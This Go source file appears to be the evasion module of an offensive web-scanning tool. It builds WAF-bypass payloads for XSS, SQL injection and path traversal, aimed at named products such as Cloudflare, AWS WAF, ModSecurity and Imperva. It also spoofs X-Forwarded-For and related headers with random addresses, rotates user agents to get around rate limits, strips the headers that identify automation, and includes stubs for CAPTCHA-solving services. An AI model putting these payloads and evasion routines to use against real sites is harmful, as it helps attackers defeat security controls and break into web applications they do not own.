package evasion

import (
	"context"
	"crypto/rand"
	"fmt"
	"math/big"
	"net/http"
	"strings"
	"time"

	"github.com/ezrec/ezrec/internal/log"
)

// EvasionEngine handles all evasion and bypass techniques
type EvasionEngine struct {
	wafBypass   *WAFBypassEngine
	rateLimiter *RateLimitEvasion
	captcha     *CaptchaSolver
	stealth     *StealthEngine
	logger      *log.Logger
}

// NewEvasionEngine creates a new evasion engine
func NewEvasionEngine(logger *log.Logger) *EvasionEngine {
	return &EvasionEngine{
		wafBypass:   NewWAFBypassEngine(),
		rateLimiter: NewRateLimitEvasion(),
		captcha:     NewCaptchaSolver("", ""), // Configure with API keys
		stealth:     NewStealthEngine(),
		logger:      logger,
	}
}

// WAF Bypass Engine
type WAFBypassEngine struct {
	techniques map[string][]BypassTechnique
}

type BypassTechnique struct {
	Name        string
	Category    string
	Template    string
	Description string
	WAFTypes    []string
	Confidence  float64
}

func NewWAFBypassEngine() *WAFBypassEngine {
	return &WAFBypassEngine{
		techniques: initializeBypassTechniques(),
	}
}

func initializeBypassTechniques() map[string][]BypassTechnique {
	return map[string][]BypassTechnique{
		"xss": {
			{
				Name:        "Mixed Case Bypass",
				Category:    "case_manipulation",
				Template:    "<ScRiPt>alert({payload})</ScRiPt>",
				Description: "Uses mixed case to bypass case-sensitive filters",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.7,
			},
			{
				Name:        "HTML Entity Encoding",
				Category:    "encoding",
				Template:    "&#60;script&#62;alert({payload})&#60;/script&#62;",
				Description: "Uses HTML entities to encode script tags",
				WAFTypes:    []string{"cloudflare", "aws_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "JavaScript Comment Injection",
				Category:    "comment_injection",
				Template:    "<script>/**/alert({payload})/**/</script>",
				Description: "Injects comments to break pattern matching",
				WAFTypes:    []string{"modsecurity", "imperva"},
				Confidence:  0.6,
			},
			{
				Name:        "Unicode Normalization",
				Category:    "encoding",
				Template:    "<\u0073cript>alert({payload})</\u0073cript>",
				Description: "Uses unicode characters to bypass filters",
				WAFTypes:    []string{"akamai", "cloudflare"},
				Confidence:  0.9,
			},
			{
				Name:        "Event Handler Bypass",
				Category:    "alternative_vectors",
				Template:    "<img src=x onerror=alert({payload})>",
				Description: "Uses event handlers instead of script tags",
				WAFTypes:    []string{"all"},
				Confidence:  0.8,
			},
		},
		"sqli": {
			{
				Name:        "Comment-based Bypass",
				Category:    "comment_injection",
				Template:    "1' /**/OR/**/1=1--",
				Description: "Uses comments to break SQL injection filters",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.7,
			},
			{
				Name:        "Union Select Bypass",
				Category:    "encoding",
				Template:    "1' %55NION %53ELECT {columns}--",
				Description: "URL encodes UNION SELECT keywords",
				WAFTypes:    []string{"modsecurity", "cloudflare"},
				Confidence:  0.8,
			},
			{
				Name:        "Double URL Encoding",
				Category:    "encoding",
				Template:    "1'%252520OR%252520'1'='1",
				Description: "Double URL encoding to bypass decoding filters",
				WAFTypes:    []string{"aws_waf", "azure_waf"},
				Confidence:  0.6,
			},
			{
				Name:        "Whitespace Bypass",
				Category:    "whitespace",
				Template:    "1'\t\nOR\t\n1=1--",
				Description: "Uses tabs and newlines instead of spaces",
				WAFTypes:    []string{"imperva", "f5_asm"},
				Confidence:  0.7,
			},
		},
		"lfi": {
			{
				Name:        "Double Encoding LFI",
				Category:    "encoding",
				Template:    "%252e%252e%252f{file}",
				Description: "Double URL encoding for path traversal",
				WAFTypes:    []string{"cloudflare", "aws_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Null Byte Bypass",
				Category:    "null_byte",
				Template:    "../../../{file}%00",
				Description: "Uses null byte to terminate string parsing",
				WAFTypes:    []string{"basic", "older_systems"},
				Confidence:  0.5,
			},
			{
				Name:        "Unicode Path Traversal",
				Category:    "encoding",
				Template:    "..\\u002f..\\u002f..\\u002f{file}",
				Description: "Unicode encoding for path separators",
				WAFTypes:    []string{"modsecurity", "imperva"},
				Confidence:  0.7,
			},
		},
	}
}

// GetBypassTechniques returns bypass techniques for a specific attack type
func (w *WAFBypassEngine) GetBypassTechniques(attackType string, wafType string) []BypassTechnique {
	techniques, exists := w.techniques[attackType]
	if !exists {
		return []BypassTechnique{}
	}

	var filtered []BypassTechnique
	for _, technique := range techniques {
		// Filter by WAF type if specified
		if wafType == "" || contains(technique.WAFTypes, wafType) || contains(technique.WAFTypes, "all") {
			filtered = append(filtered, technique)
		}
	}

	return filtered
}

// GenerateBypassPayloads creates payloads using bypass techniques
func (w *WAFBypassEngine) GenerateBypassPayloads(attackType, basePayload, wafType string) []string {
	techniques := w.GetBypassTechniques(attackType, wafType)
	var payloads []string

	for _, technique := range techniques {
		payload := strings.ReplaceAll(technique.Template, "{payload}", basePayload)
		payloads = append(payloads, payload)
	}

	return payloads
}

// Rate Limiting Evasion
type RateLimitEvasion struct {
	userAgents []string
	proxies    []string
	headers    map[string][]string
	current    int
}

func NewRateLimitEvasion() *RateLimitEvasion {
	return &RateLimitEvasion{
		userAgents: initializeUserAgents(),
		headers:    initializeHeaders(),
		current:    0,
	}
}

func initializeUserAgents() []string {
	return []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
	}
}

func initializeHeaders() map[string][]string {
	return map[string][]string{
		"Accept": {
			"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"application/json,text/plain,*/*",
			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		},
		"Accept-Language": {
			"en-US,en;q=0.9",
			"en-GB,en;q=0.9",
			"es-ES,es;q=0.9",
			"fr-FR,fr;q=0.9",
			"de-DE,de;q=0.9",
		},
		"Accept-Encoding": {
			"gzip, deflate, br",
			"gzip, deflate",
			"identity",
		},
		"Connection": {
			"keep-alive",
			"close",
		},
	}
}

// GetRandomUserAgent returns a random user agent
func (r *RateLimitEvasion) GetRandomUserAgent() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(r.userAgents))))
	return r.userAgents[n.Int64()]
}

// GetRandomHeaders returns random headers
func (r *RateLimitEvasion) GetRandomHeaders() map[string]string {
	headers := make(map[string]string)

	for headerName, values := range r.headers {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(values))))
		headers[headerName] = values[n.Int64()]
	}

	return headers
}

// ApplyEvasionHeaders applies evasion headers to an HTTP request
func (r *RateLimitEvasion) ApplyEvasionHeaders(req *http.Request) {
	req.Header.Set("User-Agent", r.GetRandomUserAgent())

	for key, value := range r.GetRandomHeaders() {
		req.Header.Set(key, value)
	}

	// Add additional evasion headers
	req.Header.Set("X-Forwarded-For", r.generateRandomIP())
	req.Header.Set("X-Real-IP", r.generateRandomIP())
	req.Header.Set("X-Originating-IP", r.generateRandomIP())
}

func (r *RateLimitEvasion) generateRandomIP() string {
	// Generate random private IP to avoid real IP exposure
	ranges := []string{
		"10.%d.%d.%d",
		"172.16.%d.%d",
		"192.168.%d.%d",
	}

	rangeIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ranges))))
	selectedRange := ranges[rangeIdx.Int64()]

	var octets []interface{}
	for i := 0; i < strings.Count(selectedRange, "%d"); i++ {
		octet, _ := rand.Int(rand.Reader, big.NewInt(255))
		octets = append(octets, octet.Int64())
	}

	return fmt.Sprintf(selectedRange, octets...)
}

// CAPTCHA Solver
type CaptchaSolver struct {
	provider string
	apiKey   string
	timeout  time.Duration
}

func NewCaptchaSolver(provider, apiKey string) *CaptchaSolver {
	return &CaptchaSolver{
		provider: provider,
		apiKey:   apiKey,
		timeout:  120 * time.Second,
	}
}

// SolveCaptcha attempts to solve a CAPTCHA challenge
func (c *CaptchaSolver) SolveCaptcha(ctx context.Context, captchaType, siteKey, pageURL string) (string, error) {
	if c.apiKey == "" {
		return "", fmt.Errorf("CAPTCHA solver not configured")
	}

	switch c.provider {
	case "2captcha":
		return c.solve2Captcha(ctx, captchaType, siteKey, pageURL)
	case "anticaptcha":
		return c.solveAntiCaptcha(ctx, captchaType, siteKey, pageURL)
	default:
		return "", fmt.Errorf("unsupported CAPTCHA provider: %s", c.provider)
	}
}

func (c *CaptchaSolver) solve2Captcha(ctx context.Context, captchaType, siteKey, pageURL string) (string, error) {
	// Implementation for 2captcha.com API
	// This would integrate with their HTTP API
	return "", fmt.Errorf("2captcha integration not implemented")
}

func (c *CaptchaSolver) solveAntiCaptcha(ctx context.Context, captchaType, siteKey, pageURL string) (string, error) {
	// Implementation for anti-captcha.com API
	return "", fmt.Errorf("anticaptcha integration not implemented")
}

// Stealth Engine
type StealthEngine struct {
	fingerprintResistance bool
	timingRandomization   bool
	behavioralMimicry     bool
	networkEvasion        bool
}

func NewStealthEngine() *StealthEngine {
	return &StealthEngine{
		fingerprintResistance: true,
		timingRandomization:   true,
		behavioralMimicry:     true,
		networkEvasion:        true,
	}
}

// ApplyStealthTechniques applies stealth techniques to a request
func (s *StealthEngine) ApplyStealthTechniques(req *http.Request) {
	if s.fingerprintResistance {
		s.applyFingerprintResistance(req)
	}

	if s.networkEvasion {
		s.applyNetworkEvasion(req)
	}
}

func (s *StealthEngine) applyFingerprintResistance(req *http.Request) {
	// Remove telltale headers that identify automated tools
	req.Header.Del("X-Requested-With")
	req.Header.Del("X-Forwarded-For")

	// Add realistic browser headers
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
}

func (s *StealthEngine) applyNetworkEvasion(req *http.Request) {
	// Add headers that might bypass some basic filters
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("DNT", "1")
	req.Header.Set("Sec-GPC", "1")
}

// GetRandomDelay returns a random delay for timing randomization
func (s *StealthEngine) GetRandomDelay() time.Duration {
	if !s.timingRandomization {
		return 0
	}

	// Random delay between 1-5 seconds
	max := big.NewInt(4000) // 4 seconds in milliseconds
	n, _ := rand.Int(rand.Reader, max)
	return time.Duration(n.Int64()+1000) * time.Millisecond
}

// Getter methods for accessing components
func (e *EvasionEngine) GetWAFBypass() *WAFBypassEngine {
	return e.wafBypass
}

func (e *EvasionEngine) GetRateLimiter() *RateLimitEvasion {
	return e.rateLimiter
}

func (e *EvasionEngine) GetCaptchaSolver() *CaptchaSolver {
	return e.captcha
}

func (e *EvasionEngine) GetStealth() *StealthEngine {
	return e.stealth
}

// Utility functions
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
